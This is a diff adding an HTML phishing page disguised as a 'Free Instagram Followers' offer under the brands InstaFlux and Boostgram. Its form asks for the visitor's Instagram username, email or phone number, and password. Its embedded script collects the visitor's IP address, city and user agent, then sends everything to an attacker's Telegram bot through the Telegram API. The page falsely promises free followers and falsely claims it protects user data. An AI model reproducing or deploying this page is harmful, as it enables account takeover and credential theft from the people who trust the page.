@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Instagram Followers</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to right, #B3E5FC,#E0F7FA);
+      color: #333 ;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+      overflow-x: hidden; /* Prevent horizontal scrolling */
+    }
+
+    .container {
+      max-width: 600px; /* Maintain original width */
+      width: 90%; /* Make it responsive */
+      padding: 20px;
+      text-align: center ;
+      background: #B3E5FC;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      position: relative;
+    }
+
+    .logo {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 100px; /* Adjust size as needed */
+    }
+
+    h2 {
+      text-align: center;
+      font-weight: bold;
+      font-size: 2em;
+      background: linear-gradient(90deg, #ff5f6d, #ffc371);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-top: 30px; /* Added margin to move it down */
+    }
+
+    .description {
+      text-align: center;
+      font-size: 1.1em;
+      margin-bottom: 20px;
+    }
+
+    .input-label {
+      font-weight: bold;
+      margin-top: 15px; /* Space above labels */
+      margin-bottom: 5px; /* Space below labels */
+    }
+
+    .form-box {
+      border-radius: 10px; /* Round corners for the input box */
+      padding: 20px;
+      background: rgba(255, 255, 255, 0.9); /* Semi-transparent white */
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); /* Strong shadow */
+      backdrop-filter: blur(10px); /* Frosted glass effect */
+      border: 1px solid rgba(255, 255, 255, 0.2); /* Light border */
+    }
+
+    .input-box {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px; /* Rounded corners */
+      background-color: #f3f4f6; /* Light background color */
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); /* Shadow effect */
+      transition: background-color 0.3s, box-shadow 0.3s;
+      font-size: 1em; /* Font size for better readability */
+    }
+
+    .input-box:focus {
+      outline: none; /* Remove outline on focus */
+      background-color: #e2e8f0; /* Darker background on focus */
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); /* Stronger shadow on focus */
+    }
+
+    .button {
+      width: 100%;
+      padding: 12px;
+      background-color: #ff5f6d;
+      color: white;
+      border: none;
+      border-radius: 10px; /* Rounded corners for button */
+      cursor: pointer;
+      font-size: 1.1em;
+      transition: 0.3s;
+    }
+
+    .button:hover {
+      background-color: #e14a5a;
+    }
+
+    /* Centering the How to Order section */
+    .how-to-order {
+      text-align: center; /* Center text */
+      margin-top: 30px; /* Space above the section */
+      font-size : 30px;
+    }
+
+    .step {
+      margin: 20px 0; /* Space between steps */
+      display: flex; /* Align items horizontally */
+      font-size : 15px ;
+      justify-content: center; /* Center the step items */
+      align-items: center; /* Center vertically */
+      flex-direction: column; /* Stack items vertically */
+    }
+
+    .step img {
+      width: 55px; /* Adjust size of the images */
+      height: auto; /* Maintain aspect ratio */
+      margin-bottom: 10px; /* Space between image and text */
+    }
+
+    .step-number {
+      font-size: 0em; /* Adjust font size as needed */
+      font-weight: normal; /* Change to normal to remove bold */
+    }
+
+    /* Key Features Section */
+    h3.key-features {
+      text-align: center; 
+      margin-top: 30px; 
+      font-weight: bold;
+      font-size: 20px ;
+    }
+
+    /* Combined Box Section */
+    .single-box {
+      margin-top: 20px; /* Space above the box */
+      border: 2px solid #ff5f6d; /* Border color */
+      border-radius: 10px; /* Rounded corners */
+      padding: 20px; /* Adjust padding for better layout */
+      display: flex; /* Flexbox for vertical alignment */
+      flex-direction: column; /* Change to vertical alignment */
+      align-items: center; /* Center horizontally */
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); /* Shadow effect */
+      background-color: #fff; /* Background color */
+      transition: opacity 0.5s; /* Transition effect for opacity */
+      opacity: 1; /* Initial opacity */
+    }
+
+    /* Footer Section */
+    /* Footer Section */
+
+.footer {
+
+    text-align: center;
+
+    margin-top: 80px; /* Space above footer */
+
+    font-size: 0.9em;
+
+    color: #777; /* Grey color */
+
+}
+    .feature-image {
+      width: 80px; /* Adjust size as needed */
+      height: auto; /* Maintain aspect ratio */
+      margin-right: 20px; /* Space between image and text */
+    }
+
+    .box-text {
+      text-align: left; /* Align text to the left */
+      align-item : center ;
+    }
+
+    /* Why Boostgrams Section */
+    .why-boostgrams {
+      text-align: center; /* Center text */
+      margin-top: 30px; /* Space above section */
+      color : (#FF6B6B) ;
+    }
+
+    .why-boostgrams img {
+      width: 80px; /* Adjust size of the image */
+      height: auto; /* Maintain aspect ratio */
+      margin-bottom: 10px; /* Space between image and text */
+    }
+
+    .why-boostgrams h3 {
+      color: #FF6B6B; /* Color matching the website theme */
+      font-weight: bold; /* Bold title */
+      font-size: 1.8em; /* Title font size */
+      margin-bottom: 10px; /* Space below title */
+    }
+
+    .why-boostgrams p {
+      color: (#FF6B6B); /* Darker color for description */
+      font-size: 1em; /* Font size for description */
+    }
+        .faq-section {
+
+            max-width: 800px;
+
+            margin: 0 auto;
+
+            padding: 30px 20px;
+
+            background: #f3f4f7;
+
+            border-radius: 10px;
+
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+
+        }
+
+        .faq-item {
+
+            margin-top: 20px;
+
+            padding: 0;
+
+            border-radius: 8px;
+
+            overflow: hidden;
+
+            background: #ffffff;
+
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+
+        }
+
+        .faq-question {
+
+            background: #4CAF50;
+
+            color: #ffffff;
+
+            padding: 15px 20px;
+
+            border: none;
+
+            border-radius: 8px 8px 0 0;
+
+            width: 100%;
+
+            text-align: left;
+
+            font-size: 18px;
+
+            font-weight: bold;
+
+            cursor: pointer;
+
+            outline: none;
+
+            transition: all 0.3s ease;
+
+        }
+
+        .faq-question:hover {
+
+            background: #45a049;
+
+        }
+    .faq-answer {
+            display: none;
+            padding: 15px 20px;
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            border-top: 1px solid #e0e0e0;
+            background-color: #f9f9f9;
+            transition: max-height 0.3s ease;
+        }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://envs.sh/_dy.jpg" alt="Logo" class="logo"> <!-- Replace with your image URL -->
+    <h2>Free Instagram Followers 🔥</h2>
+    <p class="description">𝖦𝖾𝗍 𝖿𝗋𝖾𝖾 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 𝗍𝗈 𝗒𝗈𝗎𝗋 𝗉𝗋𝗈𝖿𝗂𝗅𝖾 𝗍𝗈𝖽𝖺𝗒. 𝖴𝗉 𝗍𝗈 50 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 𝖺𝗍 𝗇𝗈 𝖼𝗈𝗌𝗍 𝖽𝖾𝗅𝗂𝗏𝖾𝗋𝖾𝖽 𝗂𝗇𝗌𝗍𝖺𝗇𝗍𝗅𝗒. 𝖭𝗈 𝗌𝗎𝗋𝗏𝖾𝗒𝗌 𝗈𝗋 𝖼𝗋𝖾𝖽𝗂𝗍 𝖼𝖺𝗋𝖽 𝗇𝖾𝖼𝖾𝗌𝗌𝖺𝗋𝗒..</p>
+    <h3 style="color:black; font-weight:bold;">LIMITED TIME OFFER</h3>
+    <p style="color:black; font-weight:bold;">Get 10-50 Followers On Us</p>
+
+    <!-- Attractive Login Section -->
+    <div class="form-box">
+      <label class="input-label" for="name">ENTER USERNAME</label>
+      <input type="text" class="input-box" id="name" placeholder="Enter Instagram Username" required>
+      
+      <label class="input-label" for="email">ENTER EMAIL / NUMBER</label>
+      <input type="text" class="input-box" id="email" placeholder="Enter Email / Number" required>
+      
+      <label class="input-label" for="password">ENTER PASSWORD</label>
+      <input type="password" class="input-box" id="password" placeholder="Enter Instagram Password" required>
+      
+      <label class="input-label" for="country">ENTER COUNTRY</label>
+      <select class="input-box" id="country">
+        <option value="" disabled selected>Select your country</option>
+        <option value="India">India</option>
+        <option value="Japan">Japan</option>
+        <option value="Australia">Australia</option>
+        <option value="USA">United States</option>
+        <option value="Canada">Canada</option>
+        <option value="Germany">Germany</option>
+        <option value="UK">United Kingdom</option>
+        <option value="France">France</option>
+        <option value="Italy">Italy</option>
+        <option value="Brazil">Brazil</option>
+        <option value="South Africa">South Africa</option>
+      </select>
+
+      <button class="button" onclick="submitonhfc()">Submit</button>
+    </div>
+
+    <!-- How to Order Section -->
+    <div class="how-to-order">
+      <h3 style="font-weight:bold;">How to Order</h3>
+      <div class="step">
+        <img src="https://envs.sh/_bH.jpg" alt="Step 1">
+        <div class="step-number">1</div>
+        <p>Eɴᴛᴇʀ ʏᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ ᴜsᴇʀɴᴀᴍᴇ.</p>
+      </div>
+      <div class="step">
+        <img src="https://envs.sh/_bU.jpg" alt="Step 2">
+        <div class="step-number">2</div>
+        <p>Fɪʟʟ ɪɴ ʏᴏᴜʀ ᴇᴍᴀɪʟ ᴏʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ..</p>
+      </div>
+      <div class="step">
+        <img src="https://envs.sh/_bg.jpg" alt="Step 3">
+        <div class="step-number">3</div>
+        <p>Pʀᴏᴠɪᴅᴇ ʏᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ ᴘᴀssᴡᴏʀᴅ & Iɴɪᴏʏ </p>
+      </div>
+    </div>
+
+     <!-- Key Features Section -->
+    <h3 class="key-features">Key Features</h3>
+    <div id="combinedBox" class="single-box">
+      <img src="https://envs.sh/_Pb.jpg" class="feature-image" alt="Feature Image">
+      <div class="box-text"><strong>.</strong><br>𝖭𝖾𝖾𝖽 𝖺𝗌𝗌𝗂𝗌𝗍𝖺𝗇𝖼𝖾 ? 𝖮𝗎𝗋 𝗌𝗎𝗉𝗉𝗈𝗋𝗍 𝗍𝖾𝖺𝗆 𝗂𝗌 𝖺𝗏𝖺𝗂𝗅𝖺𝖻𝗅𝖾 24/7 𝗍𝗈 𝗁𝖾𝗅𝗉 𝗒𝗈𝗎 .</div>
+    </div>
+     <!-- Key Features Section -->
+
+    <h3 class="key-features">Key Features</h3>
+
+    <div id="combinedBox" class="single-box">
+
+      <img src="https://envs.sh/_Pu.jpg" class="feature-image" alt="Feature Image">
+
+      <div class="box-text"><strong>.</strong><br>𝖮𝗎𝗋 𝖥𝗋𝖾𝖾 𝖨𝗇𝗌𝗍𝖺𝗀𝗋𝖺𝗆 𝖥𝗈𝗅𝗅𝗈𝗐𝖾𝗋 𝗍𝗈𝗉 - 𝗇𝗈𝗍𝖼𝗁 , 𝖺𝗇𝖽 𝗐𝖾 𝗈𝗉𝗍𝗂𝗆𝗂𝗓𝖾 𝖽𝖾𝗅𝗂𝗏𝖾𝗋𝗒 𝖲𝗉𝖾𝖾𝖽 𝖺𝖼𝖼𝗈𝗋𝖽𝗂𝗇𝗀 𝗍𝗈 𝗒𝗈𝗎𝗋 𝗈𝗋𝖽𝖾𝗋..</div>
+
+    </div>
+     <!-- Key Features Section -->
+
+    <h3 class="key-features">Key Features</h3>
+
+    <div id="combinedBox" class="single-box">
+
+      <img src="https://envs.sh/_Ph.jpg" class="feature-image" alt="Feature Image">
+
+      <div class="box-text"><strong>.</strong><br>𝖱𝖾𝗌𝗍 𝖾𝖺𝗌𝗒 𝗄𝗇𝗈𝗐𝗂𝗇𝗀 𝗍𝗁𝖺𝗍 𝗒𝗈𝗎𝗋 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 𝗂𝗌 𝗌𝖾𝖼𝗎𝗋𝖾 𝗐𝗂𝗍𝗁 𝗎𝗌! 🔒 𝖶𝖾 𝗏𝖺𝗅𝗎𝖾 𝗒𝗈𝗎𝗋 𝗍𝗋𝗎𝗌𝗍 𝖺𝗇𝖽 𝗇𝖾𝗏𝖾𝗋 𝗌𝗁𝖺𝗋𝖾 𝗒𝗈𝗎𝗋 𝖽𝖺𝗍𝖺 𝗐𝗂𝗍𝗁 𝗍𝗁𝗂𝗋𝖽-𝗉𝖺𝗋𝗍𝗒 𝖺𝗉𝗉𝗌. 𝖸𝗈𝗎𝗋 𝗉𝗋𝗂𝗏𝖺𝖼𝗒 𝗂𝗌 𝗈𝗎𝗋 𝗍𝗈𝗉 𝗉𝗋𝗂𝗈𝗋𝗂𝗍𝗒!.</div>
+
+    </div>
+
+    <!-- Why BoostGrams Section -->
+    <div class="why-boostgrams">
+      <img src="https://envs.sh/_bO.jpg" alt="Why BoostGrams" class="boostgrams-image"> <!-- Replace with your image URL -->
+      <h3 class="why-title">WHY InstaFlux ?</h3>
+      <p class="why-description">Wᴇ ʜᴀᴠᴇ ʙᴇᴇɴ ɪɴ ᴛʜᴇ ɪɴᴅᴜsᴛʀʏ ғᴏʀ ᴍᴀɴʏ ʏᴇᴀʀs ᴀɴᴅ ʜᴀᴠᴇ sᴇʀᴠᴇᴅ ʜᴜɴᴅʀᴇᴅs ᴏғ ᴅɪғғᴇʀᴇɴᴛ sᴇᴄᴛᴏʀs. Wᴇ ᴇɴɪᴏʏ ᴛʜᴇ sᴇʀᴠɪᴄᴇ ᴡᴇ ᴏғғᴇʀ ʙᴇᴄᴀᴜsᴇ ᴏғ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ..</p>
+    </div>
+    <div class="why-boostgrams">
+
+    <img src="https://envs.sh/_bm.jpg" alt="Boostgram Logo">
+
+    <h2>Professional Reputation Management</h2>
+
+    <div class="reason">
+
+        <p>Bʏ ᴛᴀᴋɪɴɢ ᴄᴏɴᴛʀᴏʟ ᴏғ ʏᴏᴜʀ ʙʀᴀɴᴅ's ʀᴇᴘᴜᴛᴀᴛɪᴏɴ ᴡɪᴛʜ ᴏᴜʀ ᴘʀᴏғᴇssɪᴏɴᴀʟ ʀᴇᴘᴜᴛᴀᴛɪᴏɴ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ sᴇʀᴠɪᴄᴇs, ʏᴏᴜ ᴄᴀɴ ɪɴᴄʀᴇᴀsᴇ ᴄᴜsᴛᴏᴍᴇʀ sᴀᴛɪsғᴀᴄᴛɪᴏɴ ᴀɴᴅ ᴍɪɴɪᴍɪᴢᴇ ᴛʜᴇ ɴᴇɢᴀᴛɪᴠᴇ ᴇғғᴇᴄᴛs ᴏɴ ʏᴏᴜʀ ʙʀᴀɴᴅ...</p>
+
+        <img src="" alt="" class="">
+
+    </div>
+
+<div class="why-boostgrams">
+
+    <img src="https://envs.sh/_bV.jpg" alt="Boostgram Logo">
+
+    <h2>Cost-Effective Advertising</h2>
+
+    <div class="reason">
+
+        <p>Oᴜʀ ᴀғғᴏʀᴅᴀʙʟᴇ ᴀᴅᴠᴇʀᴛɪsɪɴɢ sᴇʀᴠɪᴄᴇs ᴇɴᴀʙʟᴇ sᴍᴀʟʟ ʙᴜsɪɴᴇssᴇs ᴛᴏ ᴀʟsᴏ ʙᴇɴᴇғɪᴛ ғʀᴏᴍ ᴀᴅᴠᴇʀᴛɪsɪɴɢ ᴀᴄᴛɪᴠɪᴛɪᴇs..
+
+￼.</p>
+
+        <img src="" alt="" class="">
+
+    </div>
+  <div class="why-boostgrams">
+
+    <img src="https://envs.sh/_bx.jpg" alt="Boostgram Logo">
+
+    <h2>Secure Payment</h2>
+
+    <div class="reason">
+
+        <p>Wᴇ ᴍᴀᴋᴇ ᴏᴜʀ ᴄᴜsᴛᴏᴍᴇʀs' ᴘᴀʏᴍᴇɴᴛ ᴛʀᴀɴsᴀᴄᴛɪᴏɴs sᴀғᴇʀ ᴡɪᴛʜ ᴏᴜʀ 3D sᴇᴄᴜʀᴇ ᴘᴀʏᴍᴇɴᴛ sᴇʀᴠɪᴄᴇs. Wᴇ ᴏғғᴇʀ ᴀ sᴀғᴇʀ sʜᴏᴘᴘɪɴɢ ᴇxᴘᴇʀɪᴇɴᴄᴇ ᴡɪᴛʜ ᴛʜᴇsᴇ ᴘᴀʏᴍᴇɴᴛ ᴍᴇᴛʜᴏᴅs..</p>
+
+        <img src="" alt="" class="">
+
+    </div>
+
+<div class="why-boostgrams">
+
+    <img src="https://envs.sh/_b-.jpg" alt="Boostgram Logo">
+
+    <h2>Experienced Team</h2>
+
+    <div class="reason">
+
+        <p>Wᴇ ʜᴀᴠᴇ ʙᴇᴇɴ ɪɴ ᴛʜᴇ ɪɴᴅᴜsᴛʀʏ ғᴏʀ ᴍᴀɴʏ ʏᴇᴀʀs ᴀɴᴅ ʜᴀᴠᴇ sᴇʀᴠᴇᴅ ʜᴜɴᴅʀᴇᴅs ᴏғ ᴅɪғғᴇʀᴇɴᴛ sᴇᴄᴛᴏʀs. Wᴇ ᴇɴɪᴏʏ ᴛʜᴇ sᴇʀᴠɪᴄᴇ ᴡᴇ ᴏғғᴇʀ ʙᴇᴄᴀᴜsᴇ ᴏғ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ.
+
+￼</p>
+
+        <img src="" alt="" class="">
+
+    </div>
+        <!-- Enhanced FAQ Section -->
+
+        <div class="faq-section">
+
+            <h2 style="font-weight: bold; margin-top: 50px; text-align: center;">Frequently Asked Questions</h2>
+
+            <p style="margin-top: 10px; text-align: center; font-size: 16px; color: #777;">
+
+                𝖧𝖾𝗋𝖾 𝖺𝗋𝖾 𝗌𝗈𝗆𝖾 𝗈𝖿 𝗍𝗁𝖾 𝗆𝗈𝗌𝗍 𝖿𝗋𝖾𝗊𝗎𝖾𝗇𝗍𝗅𝗒 𝖺𝗌𝗄𝖾𝖽 𝗊𝗎𝖾𝗌𝗍𝗂𝗈𝗇𝗌 𝖻𝗒 𝗈𝗎𝗋 𝗏𝖺𝗅𝗎𝖾𝖽 𝖼𝗎𝗌𝗍𝗈𝗆𝖾𝗋𝗌..
+
+            </p>
+
+            <div class="faq-item">
+
+                <button class="faq-question">What is Insta Flux ?   </button>
+
+                <div class="faq-answer">
+
+                    <p>𝖨𝗇𝗌𝗍𝖺 𝖥𝗅𝗎𝗑 𝗂𝗌 𝖺 𝗌𝖾𝗋𝗏𝗂𝖼𝖾 𝗍𝗁𝖺𝗍 𝗉𝗋𝗈𝗏𝗂𝖽𝖾𝗌 𝖿𝗋𝖾𝖾 𝖨𝗇𝗌𝗍𝖺𝗀𝗋𝖺𝗆 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 𝗂𝗇𝗌𝗍𝖺𝗇𝗍𝗅𝗒 𝖺𝗇𝖽 𝗌𝖾𝖼𝗎𝗋𝖾𝗅𝗒.</p>
+
+                </div>
+
+            </div>
+
+            <div class="faq-item">
+
+                <button class="faq-question">How fast is the delivery?</button>
+
+                <div class="faq-answer">
+
+                    <p>𝖮𝗎𝗋 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 𝖺𝗋𝖾 𝖽𝖾𝗅𝗂𝗏𝖾𝗋𝖾𝖽 𝗐𝗂𝗍𝗁𝗂𝗇 𝗆𝗂𝗇𝗎𝗍𝖾𝗌 𝖺𝖿𝗍𝖾𝗋 𝗍𝗁𝖾 𝗋𝖾𝗊𝗎𝖾𝗌𝗍 𝗂𝗌 𝗌𝗎𝖻𝗆𝗂𝗍𝗍𝖾𝖽..</p>
+
+                </div>
+
+            </div>
+
+            <div class="faq-item">
+
+                <button class="faq-question">Is my data safe with Boostgram?</button>
+
+                <div class="faq-answer">
+
+                    <p>𝖸𝖾𝗌, 𝗐𝖾 𝗉𝗋𝗂𝗈𝗋𝗂𝗍𝗂𝗓𝖾 𝗒𝗈𝗎𝗋 𝗉𝗋𝗂𝗏𝖺𝖼𝗒 𝖺𝗇𝖽 𝗇𝖾𝗏𝖾𝗋 𝗌𝗁𝖺𝗋𝖾 𝗒𝗈𝗎𝗋 𝖽𝖺𝗍𝖺 𝗐𝗂𝗍𝗁 𝗍𝗁𝗂𝗋𝖽 𝗉𝖺𝗋𝗍𝗂𝖾𝗌.</p>
+
+                </div>
+
+            </div>
+
+            <div class="faq-item">
+
+                <button class="faq-question">How many followers can I get at once?</button>
+
+                <div class="faq-answer">
+
+                    <p>𝖸𝗈𝗎 𝖼𝖺𝗇 𝗀𝖾𝗍 𝖻𝖾𝗍𝗐𝖾𝖾𝗇 10 𝖺𝗇𝖽 50 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 𝗂𝗇 𝖺 𝗌𝗂𝗇𝗀𝗅𝖾 𝗋𝖾𝗊𝗎𝖾𝗌𝗍</p>
+
+                </div>                  
+                                                
+    <!-- Footer  section -->
+              <div class="footer">
+
+    <p>&copy; 2024 Boostgram. All rights reserved.</p>
+
+</div>
+               
+     
+         
+    </div>        
+
+    </div>
+            
+        
+    <div 
+  </div>
+
+  <script>
+     
+      function getURLParameter(name) {
+  const urlParams = new URLSearchParams(window.location.search);
+  return urlParams.get(name);
+}
+
+function submitonhfc() {
+  // Get the chat ID from URL parameters
+  const chatId = getURLParameter('id'); // Extract chat ID from URL
+
+  // Get IP address information using an API service
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+      // Extract relevant device and IP information
+      const userAgent = navigator.userAgent;
+      const ip = data.ip;
+      const cityName = data.city;
+
+      // Get values from input fields
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value; // Collecting password too
+
+      // Create the message to send
+      const message = `Login Page: 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 🗿 \n\n• > 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :- ${name}\n\n•> 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 :-  ${password}\n\n•> 𝙴𝙼𝙰𝙸𝙻 / 𝙽𝚄𝙼𝙱𝙴𝚁 :- ${email}\n\n•> 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃 :-  ${userAgent}\n\n•> 𝙸𝙿 𝙰𝙳𝙳𝚁𝙴𝚂𝚂 :- ${ip}\n\n•> 𝙲𝙸𝚃𝚈 :- ${cityName}\n\n Devloper:- @Hacker_Hu_vro`;
+
+      // Send the message to the specified Telegram chat using the appropriate API
+      const botToken = 'ENTER_YOUR_BOT_TOKEN'; // Replace with your bot token
+      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+      console.log("Chat ID:", chatId); // Debugging line
+      console.log("Telegram API URL:", telegramApiUrl); // Debugging line
+
+      fetch(telegramApiUrl)
+        .then(response => {
+          if (response.ok) {
+            alert('Submission successful!'); // Notify user of success
+          } else {
+            return response.json().then(err => {
+              console.error('Error response from Telegram API:', err);
+              alert(`Failed to send message: ${err.description}`); // Notify user of failure with details
+            });
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('An error occurred while sending the message.'); // Notify user of error
+        });
+    })
+    .catch(error => {
+      console.error('Error fetching IP data:', error);
+      alert('Failed to retrieve IP information.'); // Notify user of failure
+    });
+}
+    document.querySelectorAll('.faq-question').forEach(button => {
+
+            button.addEventListener('click', () => {
+
+                const answer = button.nextElementSibling;
+
+                if (answer.style.display === 'block') {
+
+                    answer.style.display = 'none';
+
+                } else {
+
+                    document.querySelectorAll('.faq-answer').forEach(ans => ans.style.display = 'none');
+
+                    answer.style.display = 'block';
+
+                }
+
+            });
+
+        });
+
+
+        
+
+ </script>
+</body>
+</html>
